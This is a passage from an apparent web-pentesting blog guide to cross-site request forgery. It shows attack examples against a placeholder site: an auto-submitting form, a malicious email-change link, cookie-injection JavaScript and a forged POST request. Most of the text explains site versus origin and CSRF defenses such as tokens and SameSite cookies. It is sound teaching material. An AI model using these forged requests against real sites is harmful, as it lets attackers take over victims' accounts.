      </li>
    </ul>
  </li>
  <li><strong>Automatic Submission</strong>:
    <ul>
      <li>The JavaScript at the end (<code class="language-plaintext highlighter-rouge">document.forms[0].submit();</code>) automatically submits the form when the page loads, making the attack seamless and invisible to the user.</li>
    </ul>
  </li>
</ol>

<hr />

<h3 id="bypassing-samesite-with-top-level-navigation"><span class="me-2"><strong>Bypassing SameSite with Top-Level Navigation</strong></span><a href="#bypassing-samesite-with-top-level-navigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>If the application uses <strong>Lax</strong> SameSite restrictions, cookies are still sent during <strong>top-level navigation</strong> (e.g., clicking a link). Attackers can exploit this by crafting a malicious link that triggers a sensitive action via a <code class="language-plaintext highlighter-rouge">GET</code> request.</p>

<h4 id="example-1"><span class="me-2">Example:</span><a href="#example-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://vulnerable-website.com/email/change?email=pwned@evil-user.net"</span><span class="nt">&gt;</span>Click here!<span class="nt">&lt;/a&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When the victim clicks the link, their browser sends the request with their session cookie, allowing the attacker to change the victim’s email address.</p>

<hr />

<h3 id="bypassing-samesite-with-cookie-injection"><span class="me-2"><strong>Bypassing SameSite with Cookie Injection</strong></span><a href="#bypassing-samesite-with-cookie-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>If an attacker can inject cookies into the victim’s browser (e.g., via subdomains or JavaScript), they can bypass SameSite restrictions. For example:</p>

<ol>
  <li>
    <p><strong>Injecting a Malicious Cookie</strong>:<br />
An attacker could use JavaScript to set a cookie on a subdomain:</p>

    <div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">session=attacker-session-id; domain=.example.com; path=/</span><span class="dl">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>Crafting a Malicious Request</strong>:<br />
The attacker then creates a malicious request that includes the injected cookie:</p>

    <div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">68</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=attacker-session-id</span>

email=pwned@evil-user.net
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<hr />

<h3 id="what-is-a-site-in-the-context-of-samesite-cookies"><span class="me-2"><strong>What is a Site in the Context of SameSite Cookies?</strong></span><a href="#what-is-a-site-in-the-context-of-samesite-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>In the context of SameSite cookie restrictions, a <strong>site</strong> is defined as the <strong>top-level domain (TLD)</strong> plus one additional level of the domain name (often referred to as <strong>TLD+1</strong>). For example:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">example.com</code> → TLD+1</li>
  <li><code class="language-plaintext highlighter-rouge">app.example.com</code> → Subdomain of TLD+1</li>
</ul>

<p>When determining whether a request is <strong>same-site</strong> or not, the <strong>URL scheme</strong> is also taken into consideration. This means that a link from <code class="language-plaintext highlighter-rouge">http://app.example.com</code> to <code class="language-plaintext highlighter-rouge">https://app.example.com</code> is treated as <strong>cross-site</strong> by most browsers.</p>

<hr />

<h3 id="difference-between-a-site-and-an-origin"><span class="me-2"><strong>Difference Between a Site and an Origin</strong></span><a href="#difference-between-a-site-and-an-origin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The difference between a <strong>site</strong> and an <strong>origin</strong> lies in their scope:</p>

<ul>
  <li>A <strong>site</strong> encompasses multiple domain names.</li>
  <li>An <strong>origin</strong> only includes one specific domain.</li>
</ul>

<p>Two URLs are considered to have the <strong>same origin</strong> if they share the exact same <strong>scheme</strong>, <strong>domain name</strong>, and <strong>port</strong>.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><strong>Request From</strong></th>
      <th><strong>Request To</strong></th>
      <th><strong>Same-Site?</strong></th>
      <th><strong>Same-Origin?</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">https://example.com</code></td>
      <td><code class="language-plaintext highlighter-rouge">https://example.com</code></td>
      <td>Yes</td>
      <td>Yes</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">https://app.example.com</code></td>
      <td><code class="language-plaintext highlighter-rouge">https://intranet.example.com</code></td>
      <td>Yes</td>
      <td>No: mismatched domain name</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">https://example.com</code></td>
      <td><code class="language-plaintext highlighter-rouge">https://example.com:8080</code></td>
      <td>Yes</td>
      <td>No: mismatched port</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">https://example.com</code></td>
      <td><code class="language-plaintext highlighter-rouge">https://example.co.uk</code></td>
      <td>No: mismatched eTLD</td>
      <td>No: mismatched domain name</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">https://example.com</code></td>
      <td><code class="language-plaintext highlighter-rouge">http://example.com</code></td>
      <td>No: mismatched scheme</td>
      <td>No: mismatched scheme</td>
    </tr>
  </tbody>
</table></div>

<p>This distinction is crucial because any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses on other domains belonging to the same site.</p>

<hr />

<h3 id="conclusion"><span class="me-2"><strong>Conclusion</strong></span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>While <strong>SameSite cookies</strong> provide a strong layer of protection against CSRF attacks, they are not foolproof. Attackers can still bypass these restrictions in certain scenarios, such as:</p>

<ul>
  <li>Using <strong>GET requests</strong> to trigger sensitive actions.</li>
  <li>Leveraging <strong>top-level navigation</strong> to include cookies.</li>
  <li>Injecting malicious cookies into the victim’s browser.</li>
</ul>

<p>Understanding how SameSite works and how it can be bypassed is essential for both developers and security professionals to ensure robust protection against CSRF and other cross-site attacks.</p>

<h1 id="summary-and-best-practices-for-defending-against-csrf">Summary and Best Practices for Defending Against CSRF</h1>

<h2 id="summary-of-csrf-vulnerabilities"><span class="me-2"><strong>Summary of CSRF Vulnerabilities</strong></span><a href="#summary-of-csrf-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing actions they didn’t intend to. It exploits the trust that a website has in a user’s browser, allowing an attacker to perform unauthorized actions on behalf of an authenticated user without their knowledge.</p>

<h3 id="key-points"><span class="me-2">Key Points:</span><a href="#key-points" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ol>
  <li><strong>How CSRF Works</strong>:
    <ul>
      <li>CSRF attacks bypass the <strong>same-origin policy</strong> by forcing users to make unintended requests to a site where they are already authenticated.</li>
      <li>The browser automatically includes session cookies with these requests, making it appear as though the user initiated the action.</li>
    </ul>
  </li>
  <li><strong>Conditions for a Successful CSRF Attack</strong>:
    <ul>
      <li><strong>Relevant Action</strong>: The attacker must have a reason to induce an action within the application (e.g., changing account settings).</li>
      <li><strong>Cookie-Based Session Handling</strong>: The application must rely solely on session cookies to authenticate and identify the user.</li>
      <li><strong>No Unpredictable Request Parameters</strong>: The action must not require any parameters that are difficult or impossible for the attacker to guess.</li>
    </ul>
  </li>
  <li><strong>Common Flaws in CSRF Token Validation</strong>:
    <ul>
      <li><strong>Validation Depends on Request Method</strong>: Some applications only enforce CSRF token validation for <code class="language-plaintext highlighter-rouge">POST</code> requests but skip it for <code class="language-plaintext highlighter-rouge">GET</code> requests.</li>
      <li><strong>Validation Depends on Token Being Present</strong>: If the token is omitted, some applications may skip validation entirely.</li>
      <li><strong>Token Not Tied to User Session</strong>: If the token is validated against a global pool of tokens rather than the user’s session, attackers can exploit this.</li>
      <li><strong>Token Tied to Non-Session Cookie</strong>: If the token is tied to a cookie other than the session cookie, attackers can manipulate this cookie to bypass CSRF protection.</li>
      <li><strong>Double Submit Cookie</strong>: If the token is duplicated in both a cookie and a request parameter, attackers can exploit cookie-setting functionality to bypass CSRF defenses.</li>
    </ul>
  </li>
  <li><strong>SameSite Cookies</strong>:
    <ul>
      <li><strong>Strict</strong>: Cookies are only sent in first-party contexts.</li>
      <li><strong>Lax</strong>: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests.</li>
      <li><strong>None</strong>: Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure.”</li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="best-practices-for-defending-against-csrf"><span class="me-2"><strong>Best Practices for Defending Against CSRF</strong></span><a href="#best-practices-for-defending-against-csrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>To protect your web application from CSRF attacks, follow these best practices:</p>

<h3 id="1-use-csrf-tokens"><span class="me-2">1. <strong>Use CSRF Tokens</strong></span><a href="#1-use-csrf-tokens" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>
    <p><strong>What Are CSRF Tokens?</strong><br />
A CSRF token is a unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions (like submitting a form), the client must include the correct CSRF token in the request.</p>
  </li>
  <li>
    <p><strong>How to Implement CSRF Tokens</strong>:<br />
Embed the CSRF token as a hidden input field in HTML forms or include it in HTTP headers for AJAX requests.</p>
  </li>
</ul>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/my-account/change-email"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
       <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"</span><span class="nt">&gt;</span>
       <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"email"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"example@normal-website.com"</span><span class="nt">&gt;</span>
       <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Update email<span class="nt">&lt;/button&gt;</span>
   <span class="nt">&lt;/form&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Effectiveness</strong>:<br />
When implemented correctly, CSRF tokens make it extremely difficult for attackers to forge valid requests because they cannot predict or guess the token.</li>
</ul>

<hr />

<h3 id="2-implement-samesite-cookies"><span class="me-2">2. <strong>Implement SameSite Cookies</strong></span><a href="#2-implement-samesite-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>
    <p><strong>Why Use SameSite Cookies?</strong><br />
SameSite cookies help prevent CSRF attacks by controlling when cookies are sent with cross-site requests. By default, Chrome applies <code class="language-plaintext highlighter-rouge">Lax</code> restrictions, but you should explicitly set the <code class="language-plaintext highlighter-rouge">SameSite</code> attribute for better control.</p>
  </li>
  <li>
    <p><strong>How to Set SameSite Cookies</strong>:<br />
Include the <code class="language-plaintext highlighter-rouge">SameSite</code> attribute in the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> response header:</p>

    <div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>Levels of SameSite Restrictions</strong>:</p>
    <ul>
      <li><strong>Strict</strong>: Cookies are only sent in first-party contexts.</li>
      <li><strong>Lax</strong>: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests.</li>
      <li><strong>None</strong>: Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure.”</li>
    </ul>
  </li>
</ul>

<hr />

<h3 id="3-validate-the-referer-header"><span class="me-2">3. <strong>Validate the Referer Header</strong></span><a href="#3-validate-the-referer-header" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>
    <p><strong>How It Works</strong>:<br />
Some applications use the <strong>Referer</strong> header to check if a request originates from the application’s own domain. This prevents cross-site requests, but it’s generally less effective than CSRF token validation because the Referer header can be manipulated or blocked by the victim’s browser.</p>
  </li>
  <li>
    <p><strong>Limitations</strong>:<br />
While this method can add an extra layer of defense, it should not be relied upon as the sole protection against CSRF. Always combine it with other measures like CSRF tokens.</p>
  </li>
</ul>

<hr />

<h3 id="4-avoid-using-get-requests-for-sensitive-actions"><span class="me-2">4. <strong>Avoid Using GET Requests for Sensitive Actions</strong></span><a href="#4-avoid-using-get-requests-for-sensitive-actions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>
    <p><strong>Why Avoid GET Requests?</strong><br />
GET requests are more vulnerable to CSRF attacks because they can be triggered via simple links or embedded resources (e.g., images). Always use <code class="language-plaintext highlighter-rouge">POST</code> (or other HTTP methods like <code class="language-plaintext highlighter-rouge">PUT</code> or <code class="language-plaintext highlighter-rouge">DELETE</code>) for actions that modify data or state.</p>
  </li>
  <li>
    <p><strong>Example</strong>:<br />
Instead of allowing email changes via a <code class="language-plaintext highlighter-rouge">GET</code> request:</p>

    <div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/email/change?email=pwned@evil-user.net</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
</pre></td></tr></tbody></table></code></div>    </div>

    <p>Require a <code class="language-plaintext highlighter-rouge">POST</code> request with proper CSRF token validation:</p>

    <div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">70</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.com
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<hr />

<h3 id="5-educate-users-about-security-risks"><span class="me-2">5. <strong>Educate Users About Security Risks</strong></span><a href="#5-educate-users-about-security-risks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>
    <p><strong>User Awareness</strong>:<br />
Educate users about the risks of clicking on suspicious links or visiting untrusted websites. Encourage them to log out of sensitive applications when not in use and to use browser extensions that block malicious scripts.</p>
  </li>
  <li>
    <p><strong>Browser Security Features</strong>:<br />
Modern browsers offer features like <strong>SameSite cookies</strong> and <strong>Content Security Policy (CSP)</strong> that can help mitigate CSRF attacks. Ensure your application takes full advantage of these features.</p>
  </li>
</ul>

<hr />

<h3 id="6-regularly-test-for-csrf-vulnerabilities"><span class="me-2">6. <strong>Regularly Test for CSRF Vulnerabilities</strong></span><a href="#6-regularly-test-for-csrf-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>
    <p><strong>Penetration Testing</strong>:<br />
Regularly test your application for CSRF vulnerabilities using tools like <strong>Burp Suite</strong>, <strong>CSRFShark</strong>, or <strong>Nakanosec CSRF Tool</strong>. These tools can help identify weaknesses in your CSRF defenses.</p>
  </li>
  <li>
    <p><strong>Automated Scanning</strong>:<br />
Use automated security scanners to detect potential CSRF vulnerabilities in your application. However, manual testing is often necessary to uncover more complex issues.</p>
  </li>
</ul>

<hr />

<h2 id="conclusion-1"><span class="me-2"><strong>Conclusion</strong></span><a href="#conclusion-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>CSRF attacks remain a significant threat to web applications, especially when proper defenses like CSRF tokens and SameSite cookies are not implemented correctly. Understanding how these attacks work and how to defend against them is crucial for securing modern web applications.</p>

<h3 id="key-takeaways"><span class="me-2"><strong>Key Takeaways</strong>:</span><a href="#key-takeaways" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ol>
  <li><strong>CSRF tokens</strong> are one of the most effective ways to prevent CSRF attacks. Ensure that tokens are tightly coupled with user sessions and validated on every sensitive request.</li>
  <li><strong>SameSite cookies</strong> provide an additional layer of protection by controlling when cookies are sent with cross-site requests. Use <code class="language-plaintext highlighter-rouge">Strict</code> or <code class="language-plaintext highlighter-rouge">Lax</code> restrictions wherever possible.</li>
  <li><strong>Avoid using GET requests</strong> for sensitive actions, and always validate the Referer header as an extra precaution.</li>
  <li><strong>Regularly test</strong> your application for CSRF vulnerabilities and stay informed about new attack techniques and defenses.</li>
</ol>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/guides/">Guides</a>,
          <a href="/categories/web-pentesting/">Web Pentesting</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/guides/"
            class="post-tag no-text-decoration"
          >Guides</a>
        
          <a
            href="/tags/csrf/"
            class="post-tag no-text-decoration"
          >CSRF</a>
        
          <a
            href="/tags/web-pentesting/"
            class="post-tag no-text-decoration"
          >Web Pentesting</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://github.com/Diogo-Lages" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Github" aria-label="Github">
        <i class="fa-fw fab fa-github"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/in/diogo-lages/" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/cors-guide">Guide to Cross-Origin Resource Sharing (CORS)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/csrf-guide">Guide to Cross-Site Request Forgery (CSRF)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ssrf-guide">Guide to Server-Side Request Forgery (SSRF)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/find-origin-ip-website">Discover the Origin IP Address of a Website and Identify WAF Protection</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ffuf-Fuzzing-Guide">FFUF: Fuzzing Guide to Web Applications</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/guides/">Guides</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web-pentesting/">Web Pentesting</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/csrf/">CSRF</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/2fa-bypass/">2FA Bypass</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/advanced-search/">Advanced Search</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/anonymity/">Anonymity</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/browser-extensions/">Browser Extensions</a>
      
    </div>
  </section>

            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/cors-guide" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1740268800"
  data-df="ll"
  
>
  Feb 23, 2025
</time>

              <h4 class="pt-0 my-2">Guide to Cross-Origin Resource Sharing (CORS)</h4>
              <div class="text-muted">
                <p>Introduction to Cross-Origin Resource Sharing (CORS)

Cross-origin resource sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It e...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ssrf-guide" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1740268800"
  data-df="ll"
  
>
  Feb 23, 2025
</time>

              <h4 class="pt-0 my-2">Guide to Server-Side Request Forgery (SSRF)</h4>
              <div class="text-muted">
                <p>Understanding Server-Side Request Forgery (SSRF)

What is SSRF?

Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce a server-side applicat...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/find-origin-ip-website" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739750400"
  data-df="ll"
  
>
  Feb 17, 2025
</time>

              <h4 class="pt-0 my-2">Discover the Origin IP Address of a Website and Identify WAF Protection</h4>
              <div class="text-muted">
                <p>Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an ...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/cors-guide"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Guide to Cross-Origin Resource Sharing (CORS)</p>
    </a>
  

  
    <a
      href="/posts/ssrf-guide"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Guide to Server-Side Request Forgery (SSRF)</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/diogo-lages">Diogo Lages</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
